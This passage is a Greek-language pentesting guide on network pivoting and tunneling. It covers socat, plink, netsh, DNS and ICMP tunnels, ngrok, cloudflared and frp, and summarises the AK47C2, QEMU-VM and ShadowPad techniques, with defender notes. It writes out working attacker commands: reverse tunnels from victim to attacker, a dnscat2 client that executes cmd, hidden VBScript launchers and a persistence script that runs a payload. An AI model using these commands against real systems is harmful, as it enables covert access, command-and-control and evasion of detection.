### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) στη θύρα 443 του host του επιτιθέμενου.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Το Plink είναι το εργαλείο σύνδεσης γραμμής εντολών του PuTTY, με επιλογές SSH forwarding παρόμοιες με αυτές του `ssh`.<sup>[[22]](#references)</sup>

Χρησιμοποιήστε κεφαλαίο `-P` για τη θύρα SSH. Το `-pw` διατηρείται για λόγους συμβατότητας, αλλά εκθέτει τον κωδικό πρόσβασης στη λίστα διεργασιών· όπου είναι δυνατό, προτιμήστε τον έλεγχο ταυτότητας με κλειδί ή το `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Καθώς αυτό το binary θα εκτελεστεί στο θύμα και είναι SSH client, ανοίξτε την υπηρεσία και τη θύρα SSH για την αντίστροφη σύνδεση· το παρακάτω χρησιμοποιεί το `-R` για να προωθήσει μια τοπικά προσβάσιμη θύρα στο μηχάνημα του επιτιθέμενου.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Χρησιμοποιήστε ένα περιβάλλον με τα απαιτούμενα δικαιώματα στον host κατά τη δημιουργία ή την αλλαγή μόνιμων κανόνων `portproxy`. Η Microsoft τεκμηριώνει τις μορφές προσθήκης, εμφάνισης και διαγραφής `v4tov4` που χρησιμοποιούνται παρακάτω.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Ανάπτυξη του `portproxy` μέσω προγραμματισμένης εργασίας

Όταν υπάρχουν διαθέσιμα διαπιστευτήρια διαχειριστή, η απομακρυσμένη εκτέλεση μέσω του Task Scheduler μπορεί να εγκαταστήσει έναν εγγενή κανόνα προώθησης χωρίς να χρειαστεί μεταφόρτωση ειδικού relay. Για παράδειγμα, το [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) μπορεί να κάνει ένα pivot να ακούει στη θύρα TCP/443 και να προωθεί τη σύνδεση σε μια εσωτερική υπηρεσία SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Ο κανόνας είναι μόνιμος, επομένως απαρίθμησέ τον με `netsh interface portproxy show v4tov4` και αφαίρεσέ τον ρητά μετά τη δοκιμή. Να θυμάσαι ότι το `portproxy` παρέχει μόνο προώθηση· το firewall του host πρέπει επίσης να επιτρέπει τη θύρα ακρόασης.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Πρέπει να έχεις **πρόσβαση RDP στο σύστημα**.\
Λήψη:

Το SocksOverRDP χρησιμοποιεί Remote Desktop Dynamic Virtual Channels για τη μεταφορά μιας σύνδεσης SOCKS5 μέσω μιας υπάρχουσας περιόδου λειτουργίας RDP· το plugin του client ακούει στη διεύθυνση `127.0.0.1:1080`, ενώ το στοιχείο του server εκτελείται στον στόχο RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 δυαδικά αρχεία](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί τα `Dynamic Virtual Channels` (`DVC`) της λειτουργίας Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **τη διοχέτευση πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier φορητό δυαδικό αρχείο](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή-πελάτη, φόρτωσε το **`SocksOverRDP-Plugin.dll`** ως εξής:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Τώρα μπορούμε να **συνδεθούμε** στο **θύμα** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να εμφανιστεί ένα **prompt** που αναφέρει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο** και ότι θα κάνει **listen** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε και εκτελέστε στο μηχάνημα του θύματος το binary `SocksOverRDP-Server.exe`:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Τώρα, επιβεβαίωσε στο μηχάνημά σου (attacker) ότι η θύρα 1080 βρίσκεται σε κατάσταση ακρόασης:

```
netstat -antb | findstr 1080
```

Τώρα μπορείς να χρησιμοποιήσεις το [**Proxifier**](https://www.proxifier.com/) για να δρομολογήσεις την κίνηση μέσω αυτής της θύρας.<sup>[[26]](#references)</sup>

### Αναζήτηση για RDP virtual-channel

Το [`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) είναι ένα ακόμη RDP virtual-channel tunnel· το προεπιλεγμένο όνομα καναλιού του είναι `rdp2tcp`, αν και ο operator μπορεί να επιλέξει διαφορετικό όνομα.<sup>[[56]](#references)</sup> Η δημιουργία και το κλείσιμο καναλιών καταγράφονται στο `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` ως event IDs **132** και **148**. Αναζήτησε τα `rdp2tcp` και σπάνια/τυχαία ονόματα καναλιών και, στη συνέχεια, σύγκρινέ τα με αναμενόμενα κανάλια όπως τα `XPSRD`, `cliprdr` και `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Δρομολόγηση Windows GUI Apps μέσω Proxifier

Μπορείς να κάνεις τα Windows GUI apps να περιηγούνται μέσω proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Στο **Profile -> Proxy Servers** πρόσθεσε την IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules** πρόσθεσε το όνομα του προγράμματος που θέλεις να δρομολογήσεις μέσω proxy και τις συνδέσεις προς τις IP που θέλεις να δρομολογήσεις μέσω proxy· οι κανόνες του Proxifier μπορούν να αντιστοιχούν σε εφαρμογές, hosts-στόχους και θύρες.<sup>[[27]](#references)</sup>

## Tunnel μέσω NTLM proxy

Το εργαλείο που αναφέρθηκε προηγουμένως, το **Rpivot**, μπορεί να δρομολογήσει την κίνηση μέσω proxy που απαιτεί NTLM authentication. Το **OpenVPN** μπορεί επίσης να δρομολογήσει την κίνηση μέσω ενός τέτοιου proxy όταν έχει ρυθμιστεί με auth file και τη μέθοδο NTLMv2· αυτό είναι proxy traversal, όχι παράκαμψη του proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Το Cntlm πραγματοποιεί authentication σε upstream NTLM proxies, εκθέτει local listeners και μπορεί να αντιστοιχίσει μια local tunnel port σε μια υπηρεσία προορισμού· οι clients μπορούν έπειτα να χρησιμοποιήσουν αυτήν την local port.<sup>[[29]](#references)</sup>\
Για παράδειγμα, προωθήστε τη θύρα 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Τώρα, αν ρυθμίσετε, για παράδειγμα, την υπηρεσία **SSH** στο victim ώστε να ακούει στη θύρα 443, μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας 2222 του attacker.<sup>[[29]](#references)</sup>\
Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443, ενώ ο attacker ακούει στη θύρα 2222.<sup>[[29]](#references)</sup>

## YARP

Το YARP (Yet Another Reverse Proxy) είναι το toolkit της Microsoft για reverse proxy σε .NET. Μπορείτε να το βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Το Iodine δημιουργεί ένα tunnel IPv4 μέσω DNS queries και χρησιμοποιεί interfaces TUN· η τεκμηριωμένη εγκατάσταση απαιτεί τα απαραίτητα δικαιώματα για τη δημιουργία αυτών των interfaces και στις δύο πλευρές.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Η μεταφορά μέσω DNS έχει μεγαλύτερη επιβάρυνση από την απευθείας TCP και είναι συνήθως αργή· μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Το Dnscat2 δημιουργεί ένα κρυπτογραφημένο κανάλι command-and-control μέσω DNS· οι εντολές server και client παρακάτω ακολουθούν την τεκμηριωμένη χρήση του.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν dnscat2 client στο PowerShell· το README του τεκμηριώνει τις παραμέτρους του `Start-Dnscat2` που εμφανίζονται παρακάτω.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding με dnscat**

Η διαδραστική εντολή `listen` του dnscat2 αντιστοιχίζει έναν τοπικό listener σε έναν απομακρυσμένο host και port.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Αλλαγή DNS στο proxychains

Το Proxychains-ng παρεμβάλλεται στις δυναμικά συνδεδεμένες συνδέσεις TCP και δεν μπορεί να μεταφέρει UDP ή ICMP· η διαμεσολάβηση DNS είναι ρυθμιζόμενη, γι’ αυτό εξετάστε το εγκατεστημένο `proxychains.conf` και το βοηθητικό πρόγραμμα resolver, αντί να θεωρείτε δεδομένο έναν σταθερό δημόσιο resolver. Τα παλαιότερα scripts `proxyresolv` παρέχουν τη μεταβλητή `PROXY_DNS_SERVER` για την επιλογή resolver· όταν απαιτούνται εσωτερικά ονόματα, χρησιμοποιήστε έναν resolver προσβάσιμο από το pivot.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Προσαρμοσμένο DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **C2 διπλού καναλιού ("AK47C2")** που εκμεταλλεύεται *μόνο* την εξερχόμενη κίνηση **DNS** και **απλού HTTP POST** — δύο πρωτόκολλα που σπάνια αποκλείονται σε εταιρικά δίκτυα.<sup>[[2]](#references)</sup>

1. **Λειτουργία DNS (AK47DNS)**
   • Δημιουργεί ένα τυχαίο SessionID 5 χαρακτήρων (π.χ. `H4T14`).  
   • Προσθέτει στην αρχή το `1` για *αιτήματα εργασιών* ή το `2` για *αποτελέσματα* και συνενώνει διαφορετικά πεδία (flags, SessionID, όνομα υπολογιστή).  
   • Κάθε πεδίο **κρυπτογραφείται με XOR χρησιμοποιώντας το κλειδί ASCII `VHBD@H`**, μετατρέπεται σε δεκαεξαδική μορφή και συνενώνεται με τελείες — με το domain που ελέγχει ο attacker στο τέλος:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Τα αιτήματα χρησιμοποιούν `DnsQuery()` για εγγραφές **TXT** (και ως εφεδρική επιλογή **MG**).  
   • Όταν η απόκριση υπερβαίνει τα 0xFF bytes, το backdoor κατακερματίζει τα δεδομένα σε τμήματα των 63 bytes και εισάγει τους δείκτες:
     `s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα αναδιατάξει.

2. **Λειτουργία HTTP (AK47HTTP)**
   • Δημιουργεί ένα JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Ολόκληρο το blob γίνεται XOR-`VHBD@H` → hex → και αποστέλλεται ως body ενός **`POST /`** με header `Content-Type: text/plain`.
   • Η απάντηση ακολουθεί την ίδια κωδικοποίηση και εκτελείται το πεδίο `cmd` με `cmd.exe /c <command> 2>&1`.

Σημειώσεις Blue Team
• Αναζητήστε ασυνήθιστα **TXT queries** των οποίων το πρώτο label είναι μεγάλο και αποτελείται από hexadecimal χαρακτήρες, ενώ τελειώνουν πάντα σε ένα σπάνιο domain.
• Ένα σταθερό XOR key που ακολουθείται από ASCII-hex εντοπίζεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
• Για HTTP, επισημάνετε bodies από POST με `text/plain` που περιέχουν αποκλειστικά hex και έχουν μήκος πολλαπλάσιο των δύο bytes.

{{#note}}
Το κανάλι διατηρεί κάθε sub-domain label εντός του ορίου των 63 octets του DNS, αλλά η συμμόρφωση με το πρωτόκολλο από μόνη της δεν το καθιστά stealthy· τα σπάνια domains, τα μεγάλα hexadecimal labels και ο όγκος των queries παραμένουν ενδείξεις για εντοπισμό.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Το Hans τεκμηριώνει ένα IPv4-over-ICMP tunnel που χρησιμοποιεί συσκευή TUN και ICMP echo requests· η ρύθμιση απαιτεί επαρκή δικαιώματα για τη δημιουργία της διεπαφής.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).

Το ptunnel-ng μεταφέρει συνδέσεις TCP μέσω ICMP και χρησιμοποιεί τις επιλογές `-p`, `-l`, `-r` και `-R` που εμφανίζονται παρακάτω για το proxy, τον τοπικό listener, τον host προορισμού και τη θύρα προορισμού.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

Το [**ngrok**](https://ngrok.com/) είναι ένας agent που επιτρέπει την πρόσβαση σε τοπικές υπηρεσίες δικτύου μέσω ασφαλούς tunnel. Το CLI του τεκμηριώνει endpoints για HTTP, TCP και file URL, ενώ το hostname του endpoint που εμφανίζεται μπορεί να διαφέρει ανάλογα με το endpoint και τον λογαριασμό.<sup>[[39]](#references)</sup>

### Εγκατάσταση

- Δημιουργήστε λογαριασμό: https://ngrok.com/signup
- Λήψη client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Βασικές χρήσεις

**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Ο agent υποστηρίζει επίσης επιλογές authentication και TLS όταν χρειάζεται.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Δημοσίευση αρχείων μέσω HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing κλήσεων HTTP

_Χρήσιμο για XSS, SSRF, SSTI ..._\
Ο standalone agent εκθέτει το interface επιθεώρησης HTTP στη διεύθυνση `http://127.0.0.1:4040` από προεπιλογή· το interface προορίζεται για την κίνηση HTTP.<sup>[[40]](#references)</sup>

#### Tunneling εσωτερικής υπηρεσίας HTTP

Η επιλογή `--host-header=rewrite` ξαναγράφει την upstream HTTP κεφαλίδα `Host`, ώστε να αντιστοιχεί στην τοπική υπηρεσία.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Παράδειγμα απλής διαμόρφωσης ngrok.yaml

Χρησιμοποιεί το ngrok Agent Config v2· τα named tunnels χρησιμοποιούν `proto` και `addr` και ξεκινούν με `ngrok start`.<sup>[[42]](#references)</sup> Ανοίγει 3 tunnels:

- 2 TCP
- 1 HTTP με έκθεση στατικών αρχείων από /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Το Microsoft Dev Tunnels μπορεί να δημοσιεύσει μια τοπική υπηρεσία που βασίζεται σε TCP μέσω της υποδομής relay της Microsoft. Το CLI του host δημιουργεί ένα outbound tunnel, ενώ η εντολή `devtunnel connect` αναδημιουργεί τη φιλοξενούμενη θύρα στον client· τα tunnels απαιτούν έλεγχο ταυτότητας από προεπιλογή, εκτός αν χαλαρώσουν σκόπιμα οι έλεγχοι πρόσβασης.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Αυτό μπορεί να εκθέσει το RDP μέσω του `*.devtunnels.ms` χωρίς να ανοίξει νέο εισερχόμενο listener στην περίμετρο. Μπορεί επίσης να συνδυαστεί με ένα RDP virtual-channel tunnel, όπως το `rdp2tcp`, μετατρέποντας τη συνεδρία RDP σε pivot δεύτερου σταδίου για αυθαίρετη κίνηση TCP.<sup>[[58]](#references)</sup>

Για τον εντοπισμό, συσχετίστε την εκτέλεση του Dev Tunnels CLI με κίνηση DNS/TLS προς το `*.devtunnels.ms` και μη αναμενόμενα συμβάντα RDP virtual-channel. Ένα authenticated tunnel δεν είναι αβλαβές απλώς και μόνο επειδή χρησιμοποιεί relay που ανήκει στη Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Ο connector `cloudflared` του Cloudflare Tunnel δημιουργεί εξερχόμενες συνδέσεις· οι δημοσιευμένες εφαρμογές μπορούν να δρομολογούν HTTP, HTTPS, TCP, SSH και RDP, ενώ τα quick tunnels προορίζονται για ανάπτυξη HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel: εντολή μίας γραμμής

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Προέλευση SOCKS5 (legacy mode)

Η legacy σημαία `--socks5` ενημερώνει το `cloudflared` ότι το τοπικό origin χρησιμοποιεί SOCKS5· δεν δημιουργεί έναν τοπικό SOCKS5 listener. Για ένα managed tunnel, το `originRequest.proxyType: socks` ρυθμίζει τη διαχείριση origin μέσω SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Επίμονα tunnels με DNS

Η ρύθμιση tunnel που διαχειρίζεται τοπικά χρησιμοποιεί τα κλειδιά `tunnel`, `credentials-file` και `url` με πεζά γράμματα, όπως φαίνεται παρακάτω.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Εκκινήστε τον connector:

```bash
cloudflared tunnel run mytunnel
```

Ο connector δημιουργεί εξερχόμενες συνδέσεις και, από προεπιλογή, διαπραγματεύεται QUIC με fallback σε HTTP/2· μην υποθέτετε ότι κάθε deployment χρησιμοποιεί TCP/443. Εκτελέστε τον μόνο με τα απαραίτητα προνόμια για το deployment σας.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

Το [`frp`](https://github.com/fatedier/frp) είναι ένα reverse proxy γραμμένο σε Go που υποστηρίζει **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX και XTCP**. Το XTCP χρησιμοποιεί P2P hole punching, η επιτυχία του οποίου εξαρτάται από το NAT. Από την έκδοση **v0.53.0** μπορεί να λειτουργήσει ως **SSH Tunnel Gateway**, ώστε ένας target host να χρησιμοποιεί τον τυπικό OpenSSH client χωρίς binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Κλασικό reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Χρήση του νέου SSH gateway (χωρίς το δυαδικό αρχείο frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Η παραπάνω εντολή δημοσιεύει τη θύρα **8080** του victim ως **attacker_ip:9000**, χρησιμοποιώντας τον τυπικό client OpenSSH, ενώ το `frps` παρέχει την πύλη.<sup>[[50]](#references)</sup>

## UDP back-connects με υποβοήθηση STUN

Τα STUN Binding requests που αποστέλλονται από ένα UDP socket μπορούν να αποκαλύψουν τη server-reflexive IP address και τη θύρα του, ενώ η περιοδική κίνηση διατηρεί ενεργό το NAT binding. Ένας δημόσιος STUN server δεν λειτουργεί ως relay για αυθαίρετα control packets.<sup>[[60]](#references)</sup> Σε ένα back-connect design που αναλύθηκε, το ίδιο UDP socket διατηρούνταν για ένα σύντομο control datagram και στη συνέχεια χρησιμοποιούνταν μια *ξεχωριστή εξερχόμενη σύνδεση TCP* για τη λήψη και εκτέλεση εντολών μετά τη λήψη του trigger.<sup>[[59]](#references)</sup>

Για να λάβει το UDP packet του controller, ένα design πρέπει και πάλι να κοινοποιήσει το mapping σε αυτόν και να ικανοποιεί την πολιτική φιλτραρίσματος του NAT. Το φιλτράρισμα που εξαρτάται από τη διεύθυνση ή τη θύρα ενδέχεται να δέχεται απαντήσεις από τον STUN server, αλλά να απορρίπτει packets από άλλο endpoint.<sup>[[60]](#references)[[61]](#references)</sup> Η διαδρομή rendezvous του backdoor που αναλύθηκε δεν επαληθεύτηκε, επομένως οι επιτυχημένες απαντήσεις STUN από μόνες τους δεν αποδεικνύουν ότι το control channel είναι προσβάσιμο.<sup>[[59]](#references)</sup> Για ένα ξεχωριστό πρωτόκολλο με ρητό rendezvous και εναλλακτική χρήση relay, δείτε το [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Κρυφά tunnels βασισμένα σε VM με QEMU

Το user-mode networking του QEMU δεν απαιτεί root ή δικαιώματα administrator για το virtual network, ενώ το `-netdev user,hostfwd=...` ανακατευθύνει συνδέσεις TCP, UDP ή UNIX από το host στο guest.<sup>[[51]](#references)</sup> Η TrustedSec τεκμηρίωσε ένα Tiny Core QEMU VM και μια απόπειρα reverse SSH tunnel σε περιστατικό όπου το EDR που εστιάζει στο host μπορούσε να παραβλέψει δραστηριότητα μέσα στο guest.<sup>[[1]](#references)</sup>

### Γρήγορη εντολή μίας γραμμής

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Η παραπάνω εντολή εκκινεί ένα guest με **Tiny Core Linux**, με 256 MiB μνήμης και δίσκο qcow2· το είδωλο δίσκου δεν είναι δίσκος in-RAM.
• Η θύρα **2222/tcp** στον Windows host προωθείται διαφανώς στη **22/tcp** μέσα στο guest.
• Από τη σκοπιά του attacker, ο στόχος απλώς εκθέτει τη θύρα 2222· τα πακέτα που φτάνουν σε αυτήν τα διαχειρίζεται ο SSH server που εκτελείται στο VM.

### Αφανής εκκίνηση μέσω VBScript

Η TrustedSec παρατήρησε εκκινήσεις QEMU μέσω VBS και εικόνες Tiny Core στο περιστατικό που αναφέρεται παραπάνω.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Η εκτέλεση του script με `cscript.exe //B update.vbs` διατηρεί το παράθυρο κρυφό.<sup>[[1]](#references)</sup>

### Persistence μέσα στο guest

Το περιστατικό που αναφέρεται περιγράφει persistence στο stateless Tiny Core guest μέσω των `/opt/bootlocal.sh` και `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Τοποθετήστε το payload στο `/opt/123.out`  
2. Προσθέστε στο τέλος του `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Προσθέστε τα `home/tc` και `opt` στο `/opt/filetool.lst`, ώστε το payload να συμπεριληφθεί στο `mydata.tgz` κατά τον τερματισμό λειτουργίας.

### Ζητήματα τηλεμετρίας

• Ο host εξακολουθεί να εκθέτει τη διεργασία QEMU, την εικόνα qcow2 και τυχόν listener με port forwarding από τον host.  
• Οι σαρώσεις διεργασιών που εκτελούνται μόνο στον host ενδέχεται να μην ελέγχουν τις διεργασίες του guest, αλλά η εικονικοποίηση δεν εγγυάται την αποφυγή εντοπισμού· η τηλεμετρία δικτύου, QEMU και εικόνων μπορεί και πάλι να το αποκαλύψει.<sup>[[1]](#references)[[51]](#references)</sup>

### Συμβουλές για defenders

• Δημιουργήστε alerts για **μη αναμενόμενα binaries QEMU/VirtualBox/KVM** σε διαδρομές εγγράψιμες από χρήστες.  
• Αποκλείστε εξερχόμενες συνδέσεις που προέρχονται από `qemu-system*.exe`.  
• Αναζητήστε σπάνιες listening ports (2222, 10022, …) που αρχίζουν να δέχονται συνδέσεις αμέσως μετά την εκκίνηση του QEMU.

## Κόμβοι relay IIS/HTTP.sys μέσω `HttpAddUrl` (ShadowPad)

Η Check Point περιγράφει το module IIS του ShadowPad ως μηχανισμό που μετατρέπει παραβιασμένους web servers περιμέτρου σε backdoor και κόμβους relay, κάνοντας bind σε προθέματα URL μέσω του `HttpAddUrl`.<sup>[[3]](#references)</sup>

Η ίδια αναφορά περιγράφει τις προεπιλεγμένες ρυθμίσεις, τους wildcard listeners, την αποκρυπτογράφηση πακέτων, τις ουρές relay και την τηλεμετρία εντοπισμού σφαλμάτων που συνοψίζονται παρακάτω.<sup>[[3]](#references)</sup>

* **Προεπιλεγμένες ρυθμίσεις** – αν το JSON config του module παραλείπει τιμές, χρησιμοποιεί ως εφεδρικές τις εύλογες προεπιλεγμένες ρυθμίσεις IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Έτσι, το IIS απαντά στην κανονική κίνηση με τη σωστή επωνυμία.
* **Παρεμβολή μέσω wildcard** – οι operators παρέχουν μια λίστα προθεμάτων URL, διαχωρισμένων με ελληνικό ερωτηματικό (wildcards σε host και path). Το module καλεί το `HttpAddUrl` για κάθε καταχώριση, οπότε το HTTP.sys δρομολογεί τα αιτήματα που ταιριάζουν στον κακόβουλο handler· τα υπόλοιπα αιτήματα εξυπηρετούνται κανονικά από το IIS.
